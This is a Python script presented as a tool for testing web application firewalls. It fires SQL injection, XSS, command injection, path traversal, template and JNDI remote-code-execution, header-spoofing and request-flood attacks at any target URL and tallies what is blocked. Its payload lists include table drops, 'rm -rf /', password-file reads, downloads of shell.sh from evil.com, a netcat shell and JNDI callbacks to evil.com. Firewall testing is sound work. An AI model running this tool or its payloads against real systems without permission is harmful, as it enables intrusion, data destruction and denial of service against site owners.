#!/usr/bin/env python3
"""
Professional WAF Attacker Tool
Simulates various real-world attack scenarios for WAF testing and validation.

Attack Types:
- DDoS (Distributed Denial of Service)
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- Remote Code Execution (RCE)
- Local/Remote File Inclusion (LFI/RFI)
- XML External Entity (XXE)
- Server-Side Request Forgery (SSRF)
- Header Manipulation
- Protocol Anomalies

Author: WAF Security Testing Suite
"""

import asyncio
import aiohttp
import random
import string
import argparse
import json
import time
from typing import List, Dict, Optional
from urllib.parse import quote, urlencode
import base64


class AttackResult:
    """Result of an attack attempt."""
    def __init__(self, attack_type: str, payload: str, status: int, response_time: float, blocked: bool):
        self.attack_type = attack_type
        self.payload = payload
        self.status = status
        self.response_time = response_time
        self.blocked = blocked
        self.timestamp = time.time()


class ProfessionalAttacker:
    """Professional-level attack tool for WAF testing."""
    
    def __init__(self, target_url: str, max_concurrent: int = 10):
        """
        Initialize attacker.
        
        Args:
            target_url: Target WAF URL (e.g., http://localhost:8000)
            max_concurrent: Maximum concurrent requests for DDoS
        """
        self.target_url = target_url.rstrip('/')
        self.max_concurrent = max_concurrent
        self.session: Optional[aiohttp.ClientSession] = None
        self.results: List[AttackResult] = []
    
    async def __aenter__(self):
        """Async context manager entry."""
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        connector = aiohttp.TCPConnector(limit=self.max_concurrent * 2)
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers={'User-Agent': 'WAF-Attacker-Tool/1.0'}
        )
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit."""
        if self.session:
            await self.session.close()
    
    async def _send_request(
        self,
        method: str,
        path: str,
        params: Optional[Dict] = None,
        headers: Optional[Dict] = None,
        data: Optional[str] = None,
        json_data: Optional[Dict] = None
    ) -> AttackResult:
        """Send HTTP request and return result."""
        url = f"{self.target_url}{path}"
        start_time = time.time()
        
        try:
            async with self.session.request(
                method=method,
                url=url,
                params=params,
                headers=headers,
                data=data,
                json=json_data
            ) as response:
                response_time = time.time() - start_time
                content = await response.read()
                blocked = response.status in [403, 429, 406] or len(content) < 100
                
                return AttackResult(
                    attack_type="request",
                    payload=f"{method} {path}",
                    status=response.status,
                    response_time=response_time,
                    blocked=blocked
                )
        except Exception as e:
            response_time = time.time() - start_time
            return AttackResult(
                attack_type="error",
                payload=f"{method} {path} - {str(e)}",
                status=0,
                response_time=response_time,
                blocked=True
            )
    
    # ========== SQL Injection Attacks ==========
    
    def get_sql_injection_payloads(self) -> List[str]:
        """Generate SQL injection attack payloads."""
        return [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "admin'/*",
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "1' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR '1'='1--",
            "1' OR '1'='1",
            "1' OR '1'='1'--",
            "1' OR '1'='1'/*",
            "1' OR '1'='1' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL, NULL--",
            "' UNION SELECT username, password FROM users--",
            "1'; DROP TABLE users--",
            "1'; EXEC xp_cmdshell('dir')--",
            "' OR 1=1; WAITFOR DELAY '00:00:05'--",
            "1'; UPDATE users SET password='hacked'--",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ]
    
    async def attack_sql_injection(self, path: str = "/search") -> List[AttackResult]:
        """Perform SQL injection attacks."""
        print("🔥 Launching SQL Injection attacks...")
        payloads = self.get_sql_injection_payloads()
        
        tasks = []
        for payload in payloads:
            # Test in query parameter
            params = {'q': payload, 'id': payload, 'user': payload}
            tasks.append(self._send_request('GET', path, params=params))
            
            # Test in POST body
            data = f"q={quote(payload)}&id={quote(payload)}"
            tasks.append(self._send_request('POST', path, data=data))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Mark results and filter exceptions
        attack_results = []
        for r in results:
            if isinstance(r, AttackResult):
                r.attack_type = "sql_injection"
                attack_results.append(r)
        
        self.results.extend(attack_results)
        
        blocked = sum(1 for r in attack_results if r.blocked)
        print(f"   ✓ SQL Injection: {blocked}/{len(attack_results)} blocked")
        return attack_results
    
    # ========== XSS Attacks ==========
    
    def get_xss_payloads(self) -> List[str]:
        """Generate XSS attack payloads."""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<div onmouseover=alert('XSS')>",
            "<svg><animatetransform onbegin=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
            "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
            "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
            "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        ]
    
    async def attack_xss(self, path: str = "/search") -> List[AttackResult]:
        """Perform XSS attacks."""
        print("🔥 Launching XSS attacks...")
        results = []
        payloads = self.get_xss_payloads()
        
        tasks = []
        for payload in payloads:
            params = {'q': payload, 'comment': payload, 'name': payload}
            tasks.append(self._send_request('GET', path, params=params))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        attack_results = [r for r in results if isinstance(r, AttackResult)]
        
        for r in attack_results:
            r.attack_type = "xss"
            if len(r.payload) > 50:
                r.payload = r.payload[:50] + "..."
        
        self.results.extend(attack_results)
        
        blocked = sum(1 for r in attack_results if r.blocked)
        print(f"   ✓ XSS: {blocked}/{len(attack_results)} blocked")
        return attack_results
    
    # ========== Command Injection Attacks ==========
    
    def get_command_injection_payloads(self) -> List[str]:
        """Generate command injection attack payloads."""
        return [
            "; ls -la",
            "| ls -la",
            "& ls -la",
            "&& ls -la",
            "|| ls -la",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; rm -rf /",
            "| rm -rf /",
            "; wget http://evil.com/shell.sh",
            "; curl http://evil.com/shell.sh",
            "`ls -la`",
            "$(ls -la)",
            "; ping -c 4 127.0.0.1",
            "| ping -c 4 127.0.0.1",
            "; nc -l -p 4444 -e /bin/sh",
            "| nc -l -p 4444 -e /bin/sh",
            "; python -c 'import os; os.system(\"id\")'",
            "| python -c 'import os; os.system(\"id\")'",
            "; php -r 'system(\"id\");'",
            "| php -r 'system(\"id\");'",
            "; perl -e 'system(\"id\")'",
            "| perl -e 'system(\"id\")'",
            "; ruby -e 'system(\"id\")'",
            "| ruby -e 'system(\"id\")'",
        ]
    
    async def attack_command_injection(self, path: str = "/api/exec") -> List[AttackResult]:
        """Perform command injection attacks."""
        print("🔥 Launching Command Injection attacks...")
        payloads = self.get_command_injection_payloads()
        
        tasks = []
        for payload in payloads:
            params = {'cmd': payload, 'command': payload, 'exec': payload}
            tasks.append(self._send_request('GET', path, params=params))
            
            data = f"cmd={quote(payload)}"
            tasks.append(self._send_request('POST', path, data=data))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        attack_results = [r for r in results if isinstance(r, AttackResult)]
        
        for r in attack_results:
            r.attack_type = "command_injection"
        
        self.results.extend(attack_results)
        
        blocked = sum(1 for r in attack_results if r.blocked)
        print(f"   ✓ Command Injection: {blocked}/{len(attack_results)} blocked")
        return attack_results
    
    # ========== Path Traversal Attacks ==========
    
    def get_path_traversal_payloads(self) -> List[str]:
        """Generate path traversal attack payloads."""
        return [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....%252f....%252f....%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
            "../../../etc/shadow",
            "../../../proc/self/environ",
            "../../../var/log/apache2/access.log",
            "../../../var/www/html/config.php",
            "../../../../boot.ini",
            "..%2f..%2f..%2f..%2fboot.ini",
            "/etc/passwd%00",
            "..\\..\\..\\..\\windows\\win.ini",
            "....//....//....//....//windows//win.ini",
        ]
    
    async def attack_path_traversal(self, path: str = "/file") -> List[AttackResult]:
        """Perform path traversal attacks."""
        print("🔥 Launching Path Traversal attacks...")
        payloads = self.get_path_traversal_payloads()
        
        tasks = []
        for payload in payloads:
            # Test in path
            test_path = f"{path}?file={quote(payload)}"
            tasks.append(self._send_request('GET', test_path))
            
            # Test in POST
            data = f"file={quote(payload)}"
            tasks.append(self._send_request('POST', path, data=data))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        attack_results = [r for r in results if isinstance(r, AttackResult)]
        
        for r in attack_results:
            r.attack_type = "path_traversal"
        
        self.results.extend(attack_results)
        
        blocked = sum(1 for r in attack_results if r.blocked)
        print(f"   ✓ Path Traversal: {blocked}/{len(attack_results)} blocked")
        return attack_results
    
    # ========== DDoS Attacks ==========
    
    async def attack_ddos(
        self,
        duration_seconds: int = 30,
        requests_per_second: int = 100,
        target_path: str = "/"
    ) -> List[AttackResult]:
        """
        Perform DDoS attack with high request rate.
        
        Args:
            duration_seconds: Attack duration
            requests_per_second: Request rate
            target_path: Target endpoint
        """
        print(f"🔥 Launching DDoS attack ({requests_per_second} req/s for {duration_seconds}s)...")
        results = []
        start_time = time.time()
        request_count = 0
        
        # Use semaphore to limit concurrent requests
        semaphore = asyncio.Semaphore(self.max_concurrent)
        
        async def send_with_semaphore():
            nonlocal request_count
            async with semaphore:
                if time.time() - start_time < duration_seconds:
                    result = await self._send_request('GET', target_path)
                    if isinstance(result, AttackResult):
                        result.attack_type = "ddos"
                        result.payload = f"Request #{request_count}"
                        request_count += 1
                    return result
                return None
        
        # Launch attack
        tasks = []
        end_time = start_time + duration_seconds
        
        while time.time() < end_time:
            # Create burst of requests
            for _ in range(requests_per_second):
                if time.time() < end_time:
                    tasks.append(send_with_semaphore())
            await asyncio.sleep(1)
        
        # Wait for all tasks
        attack_results = await asyncio.gather(*tasks, return_exceptions=True)
        results = [r for r in attack_results if r is not None and isinstance(r, AttackResult)]
        self.results.extend(results)
        
        blocked = sum(1 for r in results if r.blocked)
        print(f"   ✓ DDoS: {blocked}/{len(results)} blocked ({request_count} total requests)")
        return results
    
    # ========== RCE Attacks ==========
    
    def get_rce_payloads(self) -> List[str]:
        """Generate RCE attack payloads."""
        return [
            "${jndi:ldap://evil.com/a}",
            "${jndi:rmi://evil.com/a}",
            "${jndi:dns://evil.com/a}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
            "#{7*7}",
            "${7*7}",
            "#{java.lang.Runtime.getRuntime().exec('id')}",
            "${java.lang.Runtime.getRuntime().exec('id')}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
            "#{T(java.lang.Runtime).getRuntime().exec('id')}",
            "${#context['xwork.MethodAccessor.denyMethodExecution']=false,new java.lang.ProcessBuilder({'id'}).start()}",
            "${_jndi:ldap://evil.com/a}",
            "${_spring:ldap://evil.com/a}",
            "{{7*7}}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "${__import__('os').system('id')}",
            "${eval('__import__(\"os\").system(\"id\")')}",
        ]
    
    async def attack_rce(self, path: str = "/api/eval") -> List[AttackResult]:
        """Perform RCE attacks."""
        print("🔥 Launching RCE attacks...")
        payloads = self.get_rce_payloads()
        
        tasks = []
        for payload in payloads:
            params = {'expr': payload, 'code': payload, 'template': payload}
            tasks.append(self._send_request('GET', path, params=params))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        attack_results = [r for r in results if isinstance(r, AttackResult)]
        
        for r in attack_results:
            r.attack_type = "rce"
            if len(r.payload) > 50:
                r.payload = r.payload[:50] + "..."
        
        self.results.extend(attack_results)
        
        blocked = sum(1 for r in attack_results if r.blocked)
        print(f"   ✓ RCE: {blocked}/{len(attack_results)} blocked")
        return attack_results
    
    # ========== Header Manipulation ==========
    
    async def attack_header_manipulation(self, path: str = "/") -> List[AttackResult]:
        """Perform header manipulation attacks."""
        print("🔥 Launching Header Manipulation attacks...")
        results = []
        
        malicious_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "../../etc/passwd"},
            {"User-Agent": "<script>alert('XSS')</script>"},
            {"Referer": "javascript:alert('XSS')"},
            {"Cookie": "admin=true; session=../../etc/passwd"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-Forwarded-Host": "evil.com"},
            {"Host": "evil.com:80"},
            {"X-HTTP-Method-Override": "DELETE"},
            {"X-Requested-With": "XMLHttpRequest"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
        ]
        
        tasks = []
        for headers in malicious_headers:
            tasks.append(self._send_request('GET', path, headers=headers))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        attack_results = [r for r in results if isinstance(r, AttackResult)]
        
        for r in attack_results:
            r.attack_type = "header_manipulation"
        
        self.results.extend(attack_results)
        
        blocked = sum(1 for r in attack_results if r.blocked)
        print(f"   ✓ Header Manipulation: {blocked}/{len(attack_results)} blocked")
        return attack_results
    
    # ========== Protocol Anomalies ==========
    
    async def attack_protocol_anomalies(self, path: str = "/") -> List[AttackResult]:
        """Perform protocol anomaly attacks."""
        print("🔥 Launching Protocol Anomaly attacks...")
        results = []
        
        # Invalid methods
        invalid_methods = ["TRACE", "CONNECT", "OPTIONS", "PATCH", "DELETE"]
        tasks = []
        for method in invalid_methods:
            tasks.append(self._send_request(method, path))
        
        # Oversized headers
        oversized_headers = {
            "X-Large-Header": "A" * 10000,
            "X-Large-Cookie": "cookie=" + "A" * 10000,
        }
        tasks.append(self._send_request('GET', path, headers=oversized_headers))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        attack_results = [r for r in results if isinstance(r, AttackResult)]
        
        for r in attack_results:
            r.attack_type = "protocol_anomaly"
        
        self.results.extend(attack_results)
        
        blocked = sum(1 for r in attack_results if r.blocked)
        print(f"   ✓ Protocol Anomalies: {blocked}/{len(attack_results)} blocked")
        return attack_results
    
    # ========== Full Attack Suite ==========
    
    async def run_full_attack_suite(
        self,
        ddos_duration: int = 10,
        ddos_rps: int = 50
    ) -> Dict[str, any]:
        """
        Run complete attack suite against WAF.
        
        Returns:
            Dictionary with attack statistics
        """
        print("\n" + "="*60)
        print("🚀 PROFESSIONAL WAF ATTACK SUITE")
        print("="*60 + "\n")
        
        start_time = time.time()
        
        # Run all attacks
        await self.attack_sql_injection()
        await self.attack_xss()
        await self.attack_command_injection()
        await self.attack_path_traversal()
        await self.attack_rce()
        await self.attack_header_manipulation()
        await self.attack_protocol_anomalies()
        await self.attack_ddos(duration_seconds=ddos_duration, requests_per_second=ddos_rps)
        
        elapsed = time.time() - start_time
        
        # Calculate statistics
        total_attacks = len(self.results)
        blocked_attacks = sum(1 for r in self.results if r.blocked)
        allowed_attacks = total_attacks - blocked_attacks
        block_rate = (blocked_attacks / total_attacks * 100) if total_attacks > 0 else 0
        
        # Group by attack type
        by_type = {}
        for result in self.results:
            attack_type = result.attack_type
            if attack_type not in by_type:
                by_type[attack_type] = {"total": 0, "blocked": 0}
            by_type[attack_type]["total"] += 1
            if result.blocked:
                by_type[attack_type]["blocked"] += 1
        
        stats = {
            "total_attacks": total_attacks,
            "blocked_attacks": blocked_attacks,
            "allowed_attacks": allowed_attacks,
            "block_rate": block_rate,
            "elapsed_seconds": elapsed,
            "attacks_per_second": total_attacks / elapsed if elapsed > 0 else 0,
            "by_type": by_type
        }
        
        # Print summary
        print("\n" + "="*60)
        print("📊 ATTACK SUMMARY")
        print("="*60)
        print(f"Total Attacks:     {total_attacks}")
        print(f"Blocked:           {blocked_attacks} ({block_rate:.1f}%)")
        print(f"Allowed:           {allowed_attacks} ({100-block_rate:.1f}%)")
        print(f"Elapsed Time:      {elapsed:.2f}s")
        print(f"Attack Rate:       {stats['attacks_per_second']:.1f} req/s")
        print("\nBreakdown by Type:")
        for attack_type, data in by_type.items():
            blocked_pct = (data['blocked'] / data['total'] * 100) if data['total'] > 0 else 0
            print(f"  {attack_type:20s}: {data['blocked']:4d}/{data['total']:4d} blocked ({blocked_pct:5.1f}%)")
        print("="*60 + "\n")
        
        return stats


async def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(description="Professional WAF Attacker Tool")
    parser.add_argument(
        "--target",
        "-t",
        default="http://localhost:8000",
        help="Target WAF URL (default: http://localhost:8000)"
    )
    parser.add_argument(
        "--ddos-duration",
        "-d",
        type=int,
        default=10,
        help="DDoS attack duration in seconds (default: 10)"
    )
    parser.add_argument(
        "--ddos-rps",
        "-r",
        type=int,
        default=50,
        help="DDoS requests per second (default: 50)"
    )
    parser.add_argument(
        "--concurrent",
        "-c",
        type=int,
        default=20,
        help="Max concurrent requests (default: 20)"
    )
    parser.add_argument(
        "--output",
        "-o",
        help="Output results to JSON file"
    )
    parser.add_argument(
        "--attack-type",
        "-a",
        choices=["all", "sql", "xss", "cmd", "path", "rce", "header", "protocol", "ddos"],
        default="all",
        help="Attack type to run (default: all)"
    )
    
    args = parser.parse_args()
    
    async with ProfessionalAttacker(args.target, max_concurrent=args.concurrent) as attacker:
        if args.attack_type == "all":
            stats = await attacker.run_full_attack_suite(
                ddos_duration=args.ddos_duration,
                ddos_rps=args.ddos_rps
            )
        else:
            # Run individual attack type
            if args.attack_type == "sql":
                await attacker.attack_sql_injection()
            elif args.attack_type == "xss":
                await attacker.attack_xss()
            elif args.attack_type == "cmd":
                await attacker.attack_command_injection()
            elif args.attack_type == "path":
                await attacker.attack_path_traversal()
            elif args.attack_type == "rce":
                await attacker.attack_rce()
            elif args.attack_type == "header":
                await attacker.attack_header_manipulation()
            elif args.attack_type == "protocol":
                await attacker.attack_protocol_anomalies()
            elif args.attack_type == "ddos":
                await attacker.attack_ddos(
                    duration_seconds=args.ddos_duration,
                    requests_per_second=args.ddos_rps
                )
        
        # Save results if requested
        if args.output:
            results_data = {
                "target": args.target,
                "timestamp": time.time(),
                "stats": stats if args.attack_type == "all" else {},
                "results": [
                    {
                        "attack_type": r.attack_type,
                        "payload": r.payload,
                        "status": r.status,
                        "response_time": r.response_time,
                        "blocked": r.blocked,
                        "timestamp": r.timestamp
                    }
                    for r in attacker.results
                ]
            }
            with open(args.output, 'w') as f:
                json.dump(results_data, f, indent=2)
            print(f"📁 Results saved to: {args.output}")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n⚠️  Attack interrupted by user")
    except Exception as e:
        print(f"\n\n❌ Error: {e}")
        import traceback
        traceback.print_exc()

